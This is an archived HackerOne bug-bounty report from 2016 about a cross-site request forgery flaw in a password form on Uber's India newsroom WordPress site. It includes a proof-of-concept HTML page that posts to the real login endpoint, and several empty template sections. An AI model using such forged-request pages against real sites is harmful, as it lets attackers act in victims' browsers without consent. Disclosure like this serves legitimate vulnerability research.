# Newsroom.uber HTML form without CSRF protection

## Metadata
- **Source:** HackerOne
- **Report:** 144147 | https://hackerone.com/reports/144147
- **Submitted:** 2016-06-11
- **Reporter:** mefkan
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hi,

The link that exists CSRF vulnerability 

https://newsroom.uber.com/india/how-to-refer/


Attack details

Form name: Empty
Form action: https://newsroom.uber.com/india/wp-login.php?action=postpass&wpe-login=ubernewblog
Form method: POST

Reproduction Steps

1-Create a file named submit.html

2-Write this code to file

<html>

  <body>
    <form action="https://newsroom.uber.com/india/wp-login

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi,

The link that exists CSRF vulnerability 

https://newsroom.uber.com/india/how-to-refer/


Attack details

Form name: Empty
Form action: https://newsroom.uber.com/india/wp-login.php?action=postpass&wpe-login=ubernewblog
Form method: POST

Reproduction Steps

1-Create a file named submit.html

2-Write this code to file

<html>

  <body>
    <form action="https://newsroom.uber.com/india/wp-login.php?action=postpass&wpe-login=ubernewblog" method="POST">
      <input type="hidden" name="post&#95;password" value="xxxxxxx" />
      <input type="hidden" name="Submit" value="Enter" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


3-Then open the file with a browser click the Submit request button

NOTE:

It is an example so I didn't use a real value as you can see I used xxxxx you can change it to numbers.

I added the submit.html file to attachments.

Best regards...



</details>

---
*Analysed by Claude on 2026-05-24*
